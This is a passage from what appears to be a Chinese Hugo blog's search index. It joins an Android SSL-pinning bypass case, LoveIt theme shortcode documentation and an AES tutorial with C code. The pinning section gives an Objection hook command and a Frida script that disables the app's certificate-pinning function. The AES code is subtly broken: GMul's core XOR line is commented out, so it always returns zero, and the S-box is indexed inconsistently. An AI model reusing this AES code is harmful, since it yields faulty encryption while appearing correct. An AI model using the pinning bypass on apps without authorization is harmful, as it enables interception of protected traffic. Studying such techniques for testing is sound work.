if(isOkhttpClient(classesNames[i])){ OkhttpClientClassName = classesNames[i] var prefix = classesNames[i].split('.')[0]+'.' } } for(var i = 0; i \u003c classesNames.length; i++){ if(isCertificatePinner(classesNames[i],prefix)){ CertificatePinnerClassName = classesNames[i] } } var printOut if(OkhttpClientClassName == \"\" || CertificatePinnerClassName == \"\" || prefix == \"\"){ printOut = console.Red printOut(\"C","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:3:1","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"常规思路 在经过上述前人总结的2种方案都失败后,可以得到一个结论:App被混淆了.这种情况下,有两种思路可以借鉴: 使用Objection对所有Http字符串相关类进行Hook,定位关键的证书绑定函数. 考虑到App在验证证书时一定会打开证书文件判断是否是App自身信任的,因此一定会使用File类的构造函数打开证书文件获得文件句柄,故我们可以Hook File类的构造函数,即File$init函数.(推荐) 这里我们使用第2种方案,确保App完全关闭,然后利用Objection完成注入.需要注意的是,在终端中\"$“是特殊字符,需要进行转义. objection.exe -g cn.ticktick.task explore -s \"android hooking watch class_method java.io.File.'$'init --dump-args --dump-backtrace --dump-return\" 接下来以/system/etc/security/cacerts这个系统存放证书的路径为关键词在终端进行搜索,就会发现有一个栈的信息中存在非常明显的CertificatePinner.java文件名信息,因此可以判定函数z1.g.a()就是对应的完成证书绑定的函数. ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:3:2","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"Hook脚本 function killCertificatePinner(){ Java.perform(function(){ console.log(\"Beginning killCertificatePinner !...\") Java.use(\"z1.g\").a.implementation = function(str,list){ console.log(\"called z1.g.a ~\") return ; } }) } function main(){ killCertificatePinner(); } setImmediate(main); ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:3:3","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Android 抓包"],"content":"参考链接 \u003c安卓Frida逆向与抓包实战\u003e ","date":"2022-06-10","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/:4:0","tags":["抓包"],"title":"SSL Pinning案例","uri":"/posts/android/android%E6%8A%93%E5%8C%85/ssl-pinning%E6%A1%88%E4%BE%8B/"},{"categories":["Markdown"],"content":"LoveIt 主题在 Hugo 内置的 shortcode 的基础上提供多个扩展的 Shortcode. ","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:0:0","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"style 注意 Hugo extended 版本对于 style shortcode 是必需的. style shortcode 用来在你的文章中插入自定义样式. style shortcode 有两个位置参数. 第一个参数是自定义样式的内容. 它支持  SASS 中的嵌套语法, 并且 \u0026 指代这个父元素. 第二个参数是包裹你要更改样式的内容的 HTML 标签, 默认值是 div. 一个 style 示例: {{\u003c style \"text-align:right; strong{color:#00b1ff;}\" \u003e}} This is a **right-aligned** paragraph. {{\u003c /style \u003e}} 呈现的输出效果如下: This is a right-aligned paragraph. ","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:1:0","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"link link shortcode 有以下命名参数: href [必需]（第一个位置参数） 链接的目标。 content [可选]（第二个位置参数） 链接的内容，默认值是 href 参数的值。 支持 Markdown 或者 HTML 格式。 title [可选]（第三个位置参数） HTML a 标签 的 title 属性，当悬停在链接上会显示的提示。 card [可选]（第四个位置参数 是否显示为卡片式链接，默认值 false。 card-icon [可选] (第五个位置参数) 卡片式链接的图标，支持图片链接和 Font Awesome 图标。设置为 true，自动从链接获取缩略图。 download [可选] HTML a 标签 的 download 属性。 class [可选] HTML a 标签 的 class 属性。 rel [可选] HTML a 标签 的 rel 补充属性。 external-icon [可选] 是否自动显示外链图标。 noreferrer [可选] rel 属性是否添加 noreferrer, 默认：true。 一个 link 示例: {{\u003c link \"https://xialuohun.top\" \u003e}} 或者 {{\u003c link href=\"https://xialuohun.top \u003e}} {{\u003c link \"https://xialuohun.top\" \u003e}} 或者 {{\u003c link href=\"https://xialuohun.top\" \u003e}} {{\u003c link \"https://xialuohun.top\" xialuohun \u003e}} 或者 {{\u003c link href=\"https://xialuohun.top\" content=xialuohun \u003e}} 呈现的输出效果如下: https://xialuohun.top https://xialuohun.top XiaLuoHun 一个带有标题的 link 示例: {{\u003c link \"https://xialuohun.top\" \"\" \"XiaLuoHun\" \u003e}} 或者 {{\u003c link href=\"https://xialuohun.top\" content=\"\" title=\"XiaLuoHun\" \u003e}} 呈现的输出效果如下 (将鼠标悬停在链接上，会有一行提示): https://xialuohun.top 一个卡片式 link 示例： {{\u003c link \"https://xialuohun.top\" \"XiaLuoHun\" \"\" true \"/images/Luo.png\" \u003e}} 呈现的输出效果如下： XiaLuoHun https://xialuohun.top ","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:2:0","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"admonition admonition shortcode 支持 12 种 帮助你在页面中插入提示的横幅. 支持 Markdown 或者 HTML 格式. 注意 一个 注意 横幅 摘要 一个 摘要 横幅 信息 一个 信息 横幅 技巧 一个 技巧 横幅 成功 一个 成功 横幅 问题 一个 问题 横幅 警告 一个 警告 横幅 失败 一个 失败 横幅 危险 一个 危险 横幅 Bug 一个 Bug 横幅 示例 一个 示例 横幅 引用 一个 引用 横幅 admonition shortcode 有以下命名参数: type [必需] (第一个位置参数) admonition 横幅的类型, 默认值是 note. //参数如下 note abstract info tip success question warning failure danger bug example quote title [可选] (第二个位置参数) admonition 横幅的标题, 默认值是 type 参数的值. open [可选] (第三个位置参数) 横幅内容是否默认展开, 默认值是 true. 一个 admonition 示例: {{\u003c admonition type=tip title=\"This is a tip\" open=false \u003e}} 一个 **技巧** 横幅 {{\u003c /admonition \u003e}} 或者 {{\u003c admonition tip \"This is a tip\" false \u003e}} 一个 **技巧** 横幅 {{\u003c /admonition \u003e}} 呈现的输出效果如下: This is a tip 一个 技巧 横幅 ","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:3:0","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"mermaid 一个 流程图 mermaid 示例: {{\u003c mermaid \u003e}} graph LR; A[Hard edge] --\u003e|Link text| B(Round edge) B --\u003e C{Decision} C --\u003e|One| D[Result one] C --\u003e|Two| E[Result two] {{\u003c /mermaid \u003e}} 呈现的输出效果如下: graph LR;\rA[Hard edge] --\u003e|Link text| B(Round edge)\rB --\u003e C{Decision}\rC --\u003e|One| D[Result one]\rC --\u003e|Two| E[Result two]\rgraph LR;\rA[Hard edge] --\u003e|Link text| B(Round edge)\rB --\u003e C{Decision}\rC --\u003e|One| D[Result one]\rC --\u003e|Two| E[Result two]\r","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:4:0","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"时序图 一个 时序图 mermaid 示例: {{\u003c mermaid \u003e}} sequenceDiagram participant Alice participant Bob Alice-\u003e\u003eJohn: Hello John, how are you? loop Healthcheck John-\u003eJohn: Fight against hypochondria end Note right of John: Rational thoughts \u003cbr/\u003eprevail... John--\u003eAlice: Great! John-\u003eBob: How about you? Bob--\u003eJohn: Jolly good! {{\u003c /mermaid \u003e}} 呈现的输出效果如下: sequenceDiagram\rparticipant Alice\rparticipant Bob\rAlice-\u003e\u003eJohn: Hello John, how are you?\rloop Healthcheck\rJohn-\u003eJohn: Fight against hypochondria\rend\rNote right of John: Rational thoughts prevail...\rJohn--\u003eAlice: Great!\rJohn-\u003eBob: How about you?\rBob--\u003eJohn: Jolly good!\rsequenceDiagram\rparticipant Alice\rparticipant Bob\rAlice-\u003e\u003eJohn: Hello John, how are you?\rloop Healthcheck\rJohn-\u003eJohn: Fight against hypochondria\rend\rNote right of John: Rational thoughts prevail...\rJohn--\u003eAlice: Great!\rJohn-\u003eBob: How about you?\rBob--\u003eJohn: Jolly good!\r","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:4:1","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"甘特图 一个 甘特图 mermaid 示例: {{\u003c mermaid \u003e}} gantt dateFormat YYYY-MM-DD title Adding GANTT diagram functionality to mermaid section A section Completed task :done, des1, 2014-01-06,2014-01-08 Active task :active, des2, 2014-01-09, 3d Future task : des3, after des2, 5d Future task2 : des4, after des3, 5d section Critical tasks Completed task in the critical line :crit, done, 2014-01-06,24h Implement parser and jison :crit, done, after des1, 2d Create tests for parser :crit, active, 3d Future task in critical line :crit, 5d Create tests for renderer :2d Add to mermaid :1d {{\u003c /mermaid \u003e}} 呈现的输出效果如下: gantt\rdateFormat YYYY-MM-DD\rtitle Adding GANTT diagram functionality to mermaid\rsection A section\rCompleted task :done, des1, 2014-01-06,2014-01-08\rActive task :active, des2, 2014-01-09, 3d\rFuture task : des3, after des2, 5d\rFuture task2 : des4, after des3, 5d\rsection Critical tasks\rCompleted task in the critical line :crit, done, 2014-01-06,24h\rImplement parser and jison :crit, done, after des1, 2d\rCreate tests for parser :crit, active, 3d\rFuture task in critical line :crit, 5d\rCreate tests for renderer :2d\rAdd to mermaid :1d\rgantt\rdateFormat YYYY-MM-DD\rtitle Adding GANTT diagram functionality to mermaid\rsection A section\rCompleted task :done, des1, 2014-01-06,2014-01-08\rActive task :active, des2, 2014-01-09, 3d\rFuture task : des3, after des2, 5d\rFuture task2 : des4, after des3, 5d\rsection Critical tasks\rCompleted task in the critical line :crit, done, 2014-01-06,24h\rImplement parser and jison :crit, done, after des1, 2d\rCreate tests for parser :crit, active, 3d\rFuture task in critical line :crit, 5d\rCreate tests for renderer :2d\rAdd to mermaid :1d\r","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:4:2","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"类图 一个 类图 mermaid 示例: {{\u003c mermaid \u003e}} classDiagram Class01 \u003c|-- AveryLongClass : Cool Class03 *-- Class04 Class05 o-- Class06 Class07 .. Class08 Class09 --\u003e C2 : Where am i? Class09 --* C3 Class09 --|\u003e Class07 Class07 : equals() Class07 : Object[] elementData Class01 : size() Class01 : int chimp Class01 : int gorilla Class08 \u003c--\u003e C2: Cool label {{\u003c /mermaid \u003e}} 呈现的输出效果如下: classDiagram\rClass01 \u003c|-- AveryLongClass : Cool\rClass03 *-- Class04\rClass05 o-- Class06\rClass07 .. Class08\rClass09 --\u003e C2 : Where am i?\rClass09 --* C3\rClass09 --|\u003e Class07\rClass07 : equals()\rClass07 : Object[] elementData\rClass01 : size()\rClass01 : int chimp\rClass01 : int gorilla\rClass08 \u003c--\u003e C2: Cool label\rclassDiagram\rClass01 \u003c|-- AveryLongClass : Cool\rClass03 *-- Class04\rClass05 o-- Class06\rClass07 .. Class08\rClass09 --\u003e C2 : Where am i?\rClass09 --* C3\rClass09 --|\u003e Class07\rClass07 : equals()\rClass07 : Object[] elementData\rClass01 : size()\rClass01 : int chimp\rClass01 : int gorilla\rClass08 \u003c--\u003e C2: Cool label\r","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:4:3","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"状态图 一个 状态图 mermaid 示例: {{\u003c mermaid \u003e}} stateDiagram [*] --\u003e Still Still --\u003e [*] Still --\u003e Moving Moving --\u003e Still Moving --\u003e Crash Crash --\u003e [*] {{\u003c /mermaid \u003e}} 呈现的输出效果如下: stateDiagram\r[*] --\u003e Still\rStill --\u003e [*]\rStill --\u003e Moving\rMoving --\u003e Still\rMoving --\u003e Crash\rCrash --\u003e [*]\rstateDiagram\r[*] --\u003e Still\rStill --\u003e [*]\rStill --\u003e Moving\rMoving --\u003e Still\rMoving --\u003e Crash\rCrash --\u003e [*]\r","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:4:4","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"Git 图 一个 Git 图 mermaid 示例: {{\u003c mermaid \u003e}} gitGraph: options { \"nodeSpacing\": 100, \"nodeRadius\": 10 } end commit branch newbranch checkout newbranch commit commit checkout master commit commit merge newbranch {{\u003c /mermaid \u003e}} 呈现的输出效果如下: gitGraph:\roptions\r{\r\"nodeSpacing\": 100,\r\"nodeRadius\": 10\r}\rend\rcommit\rbranch newbranch\rcheckout newbranch\rcommit\rcommit\rcheckout master\rcommit\rcommit\rmerge newbranch\rgitGraph:\roptions\r{\r\"nodeSpacing\": 100,\r\"nodeRadius\": 10\r}\rend\rcommit\rbranch newbranch\rcheckout newbranch\rcommit\rcommit\rcheckout master\rcommit\rcommit\rmerge newbranch\r","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:4:5","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"饼图 一个 饼图 mermaid 示例: {{\u003c mermaid \u003e}} pie \"Dogs\" : 386 \"Cats\" : 85 \"Rats\" : 15 {{\u003c /mermaid \u003e}} 呈现的输出效果如下: pie\r\"Dogs\" : 386\r\"Cats\" : 85\r\"Rats\" : 15\rpie\r\"Dogs\" : 386\r\"Cats\" : 85\r\"Rats\" : 15\r","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:4:6","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"typeit typeit shortcode 基于 TypeIt 提供了打字动画. 只需将你需要打字动画的内容插入 typeit shortcode 中即可. ","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:5:0","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"简单内容 允许使用 Markdown 格式的简单内容, 并且 不包含 富文本的块内容, 例如图像等等… 一个 typeit 示例: {{\u003c typeit \u003e}} 这一个带有基于 [TypeIt](https://typeitjs.com/) 的 **打字动画** 的 *段落*... {{\u003c /typeit \u003e}} 呈现的输出效果如下: 这一个带有基于 TypeIt 的 打字动画 的 段落… 另外, 你也可以自定义 HTML 标签. 一个带有 h4 标签的 typeit 示例: {{\u003c typeit tag=h4 \u003e}} 这一个带有基于 [TypeIt](https://typeitjs.com/) 的 **打字动画** 的 *段落*... {{\u003c /typeit \u003e}} 呈现的输出效果如下: 这一个带有基于 TypeIt 的 打字动画 的 段落… ","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:5:1","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"代码内容 代码内容也是允许的, 并且通过使用参数 code 指定语言类型可以实习语法高亮. 一个带有 code 参数的 typeit 示例: {{\u003c typeit code=java \u003e}} public class HelloWorld { public static void main(String []args) { System.out.println(\"Hello World\"); } } {{\u003c /typeit \u003e}} 呈现的输出效果如下: public class HelloWorld { public static void main(String []args) { System.out.println(\"Hello World\"); } } ","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:5:2","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"分组内容 默认情况下, 所有打字动画都是同时开始的. 但是有时你可能需要按顺序开始一组 typeit 内容的打字动画. 一组具有相同 group 参数值的 typeit 内容将按顺序开始打字动画. 一个带有 group 参数的 typeit 示例: {{\u003c typeit group=paragraph \u003e}} **首先**, 这个段落开始 {{\u003c /typeit \u003e}} {{\u003c typeit group=paragraph \u003e}} **然后**, 这个段落开始 {{\u003c /typeit \u003e}} 呈现的输出效果如下: 首先, 这个段落开始 然后, 这个段落开始 ","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:5:3","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"script script shortcode 用来在你的文章中插入  Javascript 脚本. 注意 脚本内容可以保证在所有的第三方库加载之后按顺序执行. 所以你可以自由地使用第三方库. 一个 script 示例: {{\u003c script \u003e}} console.log('Hello XiaLuoHun!'); {{\u003c /script \u003e}} 你可以在开发者工具的控制台中看到输出. ","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:6:0","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"自定义属性 前提是你设置了 goldmark.parser.attribute.block 为 true。 Hugo 支持向 Markdown 块添加属性（例如 CSS 类），例如 表格、列表、段落等。 语法: some Markdown content {#id .class1 .class2 key1=\"value1\" key2=\"value2\"} 在大多数情况下，将属性列表放置在标记元素下方。对于标题和围栏代码块，将属性列表放在右侧。 标记元素 属性放置的位置 blockquote 底部 fenced code block 右侧 heading 右侧 horizontal rule 底部 image 底部 list 底部 paragraph 底部 table 底部 例子: 带有 CSS 类的分割线： --- {.awesome-hr} 呈现的输出如下所示: 带有 CSS 类的块引用： \u003e foo\\ \u003e bar {#test-id .text-danger} 呈现的输出如下所示： foo bar 目前有一些限制：对于表格，你目前只能将其应用于完整表格，而对于列表，仅适用于 ul/ol 节点，例如： * 水果 * 苹果 * 橙子 * 香蕉 {.text-success} * 乳制品 * 牛奶 * 奶酪 {.text-warning} {.text-primary} 呈现的输出如下所示： 水果 苹果 橙子 香蕉 乳制品 牛奶 奶酪 给代码块添加 title 属性，例如： ```js {title=\"Luo.js\"} console.log('hello XiaLuoHun!'); ``` 呈现的输出效果如下： console.log('hello XiaLuoHun!'); ","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:7:0","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["Markdown"],"content":"警示 警示也被称为callouts或admonitions,是用于强调关键信息的引用块。以下是所有五种类型的示例： \u003e [!NOTE] \u003e 突出显示用户应考虑的信息，即使只是浏览也应考虑。 \u003e [!TIP] \u003e 可选信息，可帮助用户取得更大的成功。 \u003e [!IMPORTANT] \u003e 用户成功所需的关键信息。 \u003e [!WARNING] \u003e 由于存在潜在风险，需要用户立即关注的关键内容。 \u003e [!CAUTION] \u003e 操作的潜在负面后果。 它们的显示方式如下： 注意 突出显示用户应考虑的信息，即使只是浏览也应考虑。 提示 可选信息，可帮助用户取得更大的成功。 重要 用户成功所需的关键信息。 警告 由于存在潜在风险，需要用户立即关注的关键内容。 小心 操作的潜在负面后果。 ","date":"2022-06-06","objectID":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/:8:0","tags":["Markdown"],"title":"扩展 Shortcodes","uri":"/posts/markdown/%E6%89%A9%E5%B1%95-shortcodes/"},{"categories":["加密算法"],"content":"算法描述 在AES算法中密钥长度、分组长度和轮数的对应关系如下: 密钥长度(Nk个32位双字) 分组长度(Nb个32位双字) 轮数(Nr) AES-128 4 4 10 AES-192 6 4 12 AES-256 8 4 14 对AES算法来说,输入分组、输出分组及状态分组的长度都是128比特,即Nb = 4. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:1:0","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"加密过程 ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:0","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"总体 将输入复制到状态数组中,在进行一次初始轮密钥相加操作之后,执行Nr次轮函数,对状态数组进行变换,其中最后一轮不同于前Nr-1轮.将最终的状态数组复制到输出数组中,即得到最终的密文. 轮函数由4部分组成,分别是subBytes(),shiftRows(),mixColumns(),addRoundKey(). 其加密过程的伪代码如下: //对AES-128加密来说,Nk = 4,Nb = 4,Nr = 10 void AES_XXX_Encrypt(uint8 in[4*Nb], uint8 out[4*Nb], uint8 key[4*Nk]) { //将输入复制到状态数组 uint8 state[4*Nb] = in; //密钥扩展 uint32 dw[Nb*(Nr+1)] = keyExpansion(key[4*Nk]); //轮密相加 addRoundKey(state, dw[0, Nb-1]); for (int round = 1; round \u003c Nr; ++round) { subBytes(state); //字节代换 shiftRows(state); //行移位 mixColumns(state); //列混合 addRoundKey(state, dw[round*Nb, (round+1)*Nb-1]); //轮密相加 dw[4-7],dw[8-11]... } subBytes(state); shiftRows(state); addRoundKey(state, dw[Nr*Nb,(Nr+1)*Nb-1]); out = state; } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:1","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"密钥扩展(keyExpansion) 通过对用户输入的128位、192位或者256位的密钥进行处理,共生成Nb*(Nr+1)个32位双字,为加解密算法的轮函数提供轮密钥. 其代码表示如下: void XorWords(uint8* a, uint8* b, uint8* c) { int i; for (i = 0; i \u003c 4; i++) { c[i] = a[i] ^ b[i]; } } uint8 xtime(uint8 b) // multiply on x { return (b \u003c\u003c 1) ^ (((b \u003e\u003e 7) \u0026 1) * 0x1b); } void Rcon(uint8* a, int n) { int i; uint8 c = 1; for (i = 0; i \u003c n - 1; i++) { c = xtime(c); } a[0] = c; a[1] = a[2] = a[3] = 0; } void SubWord(uint8* a) { int i; for (i = 0; i \u003c 4; i++) { a[i] = S[a[i] / 16][a[i] % 16]; } } void RotWord(uint8* a) { uint8 c = a[0]; a[0] = a[1]; a[1] = a[2]; a[2] = a[3]; a[3] = c; } //密钥扩展 void KeyExpansion(uint8 key[4 * Nk], uint8 w[4 * Nb * (Nr + 1)]) { uint8* temp = new uint8[4]; uint8* rcon = new uint8[4]; int i = 0; while (i \u003c 4 * Nk) { w[i] = key[i]; i++; } i = 4 * Nk; while (i \u003c 4 * Nb * (Nr + 1)) { temp[0] = w[i - 4 + 0]; temp[1] = w[i - 4 + 1]; temp[2] = w[i - 4 + 2]; temp[3] = w[i - 4 + 3]; if (i / 4 % Nk == 0) { RotWord(temp); SubWord(temp); Rcon(rcon, i / (Nk * 4)); XorWords(temp, rcon, temp); } else if (Nk \u003e 6 \u0026\u0026 i / 4 % Nk == 4) { SubWord(temp); } w[i + 0] = w[i - 4 * Nk] ^ temp[0]; w[i + 1] = w[i + 1 - 4 * Nk] ^ temp[1]; w[i + 2] = w[i + 2 - 4 * Nk] ^ temp[2]; w[i + 3] = w[i + 3 - 4 * Nk] ^ temp[3]; i += 4; } delete[]rcon; delete[]temp; } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:2","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"字节代换(subBytes) 实际上就是一个简单的查表操作.AES定义了一个16x16字节的S-box,以状态数组中的每个字节元素的高4位为行标,低4位为列标,取出相应的元素作为subBytes操作的结果.例如,16进制值{21},高4位为2,低4位为1,取S-box中行标为2、列表为1的值组成16进制值{FD},则{21}被替换为{FD}. 其代码表示如下: void subBytes(uint8(*state)[4]) { /* i: row, j: col */ for (int i = 0; i \u003c 4; ++i) { for (int j = 0; j \u003c 4; ++j) { state[i][j] = S[state[i][j]]; } } } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:3","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"行移位(shiftRows) 状态数组的第1行保持不变,第2行循环左移1字节,第3行循环左移2字节,第4行循环左移3字节.例如,对状态: F6 A6 82 A4 14 8C 48 7F 46 EA 26 19 C1 53 A7 14 进行行移位之后,结果为: F6 A6 82 A4 8C 48 7F 14 26 19 46 EA 14 C1 53 A7 其代码表示如下: //循环左移 void leftLoop4int(uint32 array[4], int step) { uint32 temp[4]; for (int i = 0; i \u003c 4; i++) temp[i] = array[i]; int index = step % 4 == 0 ? 0 : step % 4; for (int i = 0; i \u003c 4; i++) { array[i] = temp[index]; index++; index = index % 4; } } //行移位 void shiftRows(uint8 array[4][4]) { uint32 rowTwo[4], rowThree[4], rowFour[4]; //复制状态矩阵的第2,3,4行 for (int i = 0; i \u003c 4; i++) { rowTwo[i] = array[1][i]; rowThree[i] = array[2][i]; rowFour[i] = array[3][i]; } //循环左移相应的位数 leftLoop4int(rowTwo, 1); leftLoop4int(rowThree, 2); leftLoop4int(rowFour, 3); //把左移后的行复制回状态矩阵中 for (int i = 0; i \u003c 4; i++) { array[1][i] = rowTwo[i]; array[2][i] = rowThree[i]; array[3][i] = rowFour[i]; } } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:4","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"列混合(mixColumns) 先把状态矩阵初始状态复制一份到tmpArray中,然后将tmpArray与M矩阵相乘,其中M存放的是要乘的常数矩阵数组,GMul函数定义了矩阵相乘时的乘法,加法则直接通过异或来实现. 其代码表示如下: uint8 GMul(uint8 u, uint8 v) { uint8 p = 0; for (int i = 0; i \u003c 8; ++i) { if (u \u0026 0x01) { // p ^= v; } int flag = (v \u0026 0x80); v \u003c\u003c= 1; if (flag) { v ^= 0x1B; /* x^8 + x^4 + x^3 + x + 1 */ } u \u003e\u003e= 1; } return p; } int mixColumns(uint8(*state)[4]) { uint8 tmpArray[4][4]; uint8 M[4][4] = { {0x02, 0x03, 0x01, 0x01}, {0x01, 0x02, 0x03, 0x01}, {0x01, 0x01, 0x02, 0x03}, {0x03, 0x01, 0x01, 0x02} }; /* copy state[4][4] to tmp[4][4] */ for (int i = 0; i \u003c 4; ++i) { for (int j = 0; j \u003c 4; ++j) { tmpArray[i][j] = state[i][j]; } } for (int i = 0; i \u003c 4; ++i) { for (int j = 0; j \u003c 4; ++j) { state[i][j] = GMul(M[i][0], tmpArray[0][j]) ^ GMul(M[i][1], tmpArray[1][j]) ^ GMul(M[i][2], tmpArray[2][j]) ^ GMul(M[i][3], tmpArray[3][j]); } } return 0; } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:5","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"轮密相加(addRoundKey) 将状态数组中的元素与轮密钥通过简单的异或运算相加.轮密钥是由用户输入的密钥通过密钥扩展生成的,同样可以看成一个状态数组. 其代码表示如下: #define BYTE(x, n) (((x) \u003e\u003e (8 * (n))) \u0026 0xff) void addRoundKey(uint8(*state)[4], const uint32* key) { uint8 k[4][4]; /* i: row, j: col */ for (int i = 0; i \u003c 4; ++i) { for (int j = 0; j \u003c 4; ++j) { k[i][j] = (uint8)BYTE(key[j], 3 - i); /* copy uint32 key[4] to uint8 k[4][4] */ state[i][j] ^= k[i][j]; } } } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:6","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"解密过程 